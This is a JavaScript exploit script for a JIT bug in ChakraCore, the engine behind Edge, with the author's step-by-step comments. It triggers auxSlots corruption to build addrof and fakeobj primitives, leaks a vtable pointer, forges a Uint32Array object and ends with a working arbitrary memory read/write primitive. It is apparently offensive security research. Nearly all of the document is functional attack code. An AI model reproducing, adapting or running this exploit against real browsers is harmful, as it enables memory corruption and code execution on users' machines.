// Exploit for commit e149067c8f1a80462ac77d863b9bfb0173d0ced3
// bug introduced by 8c5332b8eb5663e4ec2636d81175ccf7a0820ff2

var convert = new ArrayBuffer(0x100);
var u32 = new Uint32Array(convert);
var f64 = new Float64Array(convert);
var scratch = new ArrayBuffer(0x100000);
var scratch_u8 = new Uint8Array(scratch);
var scratch_u32 = new Uint32Array(scratch);
var BASE = 0x100000000;

function hex(x) {
    return `0x${x.toString(16)}`
}

function bytes_to_u64(bytes) {
    return (bytes[0]+bytes[1]*0x100+bytes[2]*0x10000+bytes[3]*0x1000000
        +bytes[4]*0x100000000+bytes[5]*0x10000000000);
}

function lower(x) {
    return x & 0xffffffff;
}
let lo = lower;

function higher(x) {
    return (x - (x % BASE)) / BASE;
}
let hi = higher;

function i2f(x) {
    u32[0] = x % BASE;
    u32[1] = (x - (x % BASE)) / BASE;
    return f64[0];
}

function f2i(x) {
    f64[0] = x;
    return u32[0] + BASE * u32[1];
}

// EXPLOIT

// this creates an object of a certain size which makes so that its auxSlots is full, adding a property to it will require adjustment
// First version of the bug was trivial, we just needed 20 regular properties
// But first patch was easy to bypass by defining an accessor so we just remove 2 properties (accessors take up two slots in the auxSlots buffer)
function make_obj() {
    let o = {};
    o.a1=0x4000;
    o.a2=0x4000;
    o.a3=0x4000;
    o.a4=0x4000;
    o.a5=0x4000;
    o.a6=0x4000;
    o.a7=0x4000;
    o.a8=0x4000;
    o.a9=0x4000;
    o.a10=0x4000;
    o.a11=0x4000;
    o.a12=0x4000;
    o.a13=0x4000;
    o.a14=0x4000;
    o.a15=0x4000;
    o.a16=0x4000;
    o.a17=0x4000;
    o.a18=0x4000;
    //o.a19=0x4000;
    //o.a20=0x4000;
    return o;
}

let roots = [];

// our buggy function to trigger the JIT bug
function opt(o) {
    o.__defineGetter__("accessor",() => {})
    o.a2; // set auxSlots as live
    o.pwn = 0x4000; // clobers vtable
}


addrof_idx = -1;
function setup_addrof(toLeak) {
    for (var i = 0; i < 1000; i++) {
        addrof_hax = [1.1];
        addrof_hax[0x7000] = 0x200000 // create a higher up segment to avoid setting length
        let o = make_obj();
        addrof_hax[0x1000] = 1337.36; // this will allocate a segment right past the auxSlots of o, we can overwrite the first qword which contains length and index
        opt(o);
        // now if we triggered the bug, we overwrote the first qword of the segment for index 0x1000 so that it thinks the index is 0x4000 and length 0x10000 (tagged integer 0x4000)
        // if we access 0x4000 and read the marker value we put, then we know it was corrupted
        if (addrof_hax[0x4000] == 1337.36) {
            print("[+] corruption done for addrof");
            break;
        }
    }
    addrof_hax2 = [];
    addrof_hax2[0x1337]  = toLeak;

    // this will be the first qword of the segment of addrof_hax2 which holds the object we want to leak
    marker = 2.1219982213e-314 // 0x100001337;


    for (let i = 0; i < 0x500; i++) {
        let v = addrof_hax[0x4010 + i];
        if (v == marker) {
            print("[+] Addrof: found marker value");
            addrof_idx = i;
            return;
        }
    }

    setup_addrof();
}
var addrof_setupped = false;
function addrof(toLeak) {
    if (!addrof_setupped) {
        print("[!] Addrof layout not set up");
        setup_addrof(toLeak);
        addrof_setupped = true;
        print("[+] Addrof layout done!!!");
    }
    addrof_hax2[0x1337] = toLeak
    return f2i(addrof_hax[0x4010 + addrof_idx + 3]);
}

// this one is a bit more flaky
// since here we corrupt a JavascriptArray, there is no scanning for marker values and such the index is hardcoded
// in my experiments it works fine though:
// we end up with a layout where we have (=> means followed by in memory)
//  full auxSlots => JavascriptArray that we corrupt => NativeDouble array where we set the addr to which we want a javascript object
//  by corrupting the JavascriptArray we can access oob into the NativeDouble array to fetch an unboxed value, which for the interpreter will mean this is an object
function setup_fakeobj(addr) {
    for (var i = 0; i < 100; i++) {
        fakeobj_hax = [{}];
        fakeobj_hax2 = [addr];
        fakeobj_hax[0x7000] = 0x200000 // create a higher up segment to avoid setting length
        fakeobj_hax2[0x7000] = 1.1;
        let o = make_obj();
        fakeobj_hax[0x1000] = i2f(0x404040404040); // this will allocate a segment right past the auxSlots of o, we can overwrite the first qword which contains length and index
        fakeobj_hax2[0x3000] = addr;
        fakeobj_hax2[0x3001] = addr;
        fakeobj_hax2[0x3002] = i2f(0x464646);
        opt(o);
        // now if we triggered the bug, we overwrote the first qword of the segment for index 0x1000 so that it thinks the index is 0x4000 and length 0x10000 (tagged integer 0x4000)
        // if we access 0x4000 and read the marker value we put, then we know it was corrupted
        if (fakeobj_hax[0x4000] == i2f(0x404040404040)) {
            print("[+] corruption done for fakeobj");
            break;
        }
    }
    //Math.acos(fakeobj_hax);
    return fakeobj_hax[0x4000 + 20] // access OOB into fabeobj_hax2
}

var fakeobj_setuped = false;
function fakeobj(addr) {
    if (!fakeobj_setuped) {
        print("[!] Fakeobj layout not set up");
        setup_fakeobj(addr);
        fakeobj_setuped = true;
        print("[+] Fakeobj layout done!!!");
    }
    fakeobj_hax2[0x3000] = addr;
    return fakeobj_hax[0x4000 + 20]
}
print("[+] Checking primitives: obj == fakeobj(addrof(obj)) ?")


let test = {x:0x1337};
let testaddr = addrof(test)
if (fakeobj(i2f(testaddr)) != test) throw "null";

print("[+] Primitives are good");



let a = new Array(16);
let b = new Array(16);

let addr = addrof(a);
let type = addr + 0x68;

// type of Uint64
a[4] = 0x6;
a[6] = lo(addr); a[7] = hi(addr);
a[8] = lo(addr); a[9] = hi(addr);

a[14] = 0x414141;
a[16] = lo(type)
a[17] = hi(type)

// object is at a[14]
let fake = fakeobj(i2f(addr + 0x90))
let vtable = parseInt(fake);

print("[+] vtable pointer " + hex(vtable));
print("[+] Static offset to Uint32Array vtable == 0xe3a8")

let uint32_vtable = vtable + 0xe3a8;
print("[+] Uint32Array vtable pointer " + hex(uint32_vtable));

// Now here comes the object faking gymnastics
// We need to satisfy a few things to fake a typed array successfully which will give us a rw primitives
// Uint32Array vtable
// fake a type* pointer where we can set the typeID of Uint32TypedArray This is susceptible to change although unlikely, check in EdgeJavascriptTypeId.h
// We use array constructor with small sizes because the data is allocated inline so by calling addrof on these we know where we have controled data


print("[+] Faking objects ...");


// Copy pasted from my presentation at SSTIC 2019

type = new Array(16);
type[0] = 50; // TypeIds_Uint32Array = 50,
type[1] = 0;
typeAddr = addrof(type) + 0x58;
type[2] = lo(typeAddr); // ScriptContext is fetched and passed during SetItem so just make sure we don't use a bad pointer
type[3] = hi(typeAddr);

ab = new ArrayBuffer(0x1338);
abAddr = addrof(ab);

fakeObject = new Array(16);
fakeObject[0] = lo(uint32_vtable);
fakeObject[1] = hi(uint32_vtable);

fakeObject[2] = lo(typeAddr);
fakeObject[3] = hi(typeAddr);

fakeObject[4] = 0; // zero out auxSlots
fakeObject[5] = 0;

fakeObject[6] = 0; // zero out objectArray
fakeObject[7] = 0;

fakeObject[8] = 0x1000;
fakeObject[9] = 0;

fakeObject[10] = lo(abAddr);
fakeObject[11] = hi(abAddr);

address = addrof(fakeObject);

fakeObjectAddr = address + 0x58;

arr = fakeobj(i2f(fakeObjectAddr));
print("[+] Fake typed array " + hex(fakeObjectAddr));


memory = {
    setup: function(addr) {
        fakeObject[14] = lower(addr);
        fakeObject[15] = higher(addr);
    },
    write32: function(addr, data) {
        memory.setup(addr);
        arr[0] = data;
    },
    write64: function(addr, data) {
        memory.setup(addr);
        arr[0] = data & 0xffffffff;
        arr[1] = data / 0x100000000;
    },
    read64: function(addr) {
        memory.setup(addr);
        return arr[0] + arr[1] * BASE;
    }
};


print("[+] Reading at " + hex(address) + " value: " + hex(memory.read64(address)));

memory.write32(0x414243444546, 0x1337);
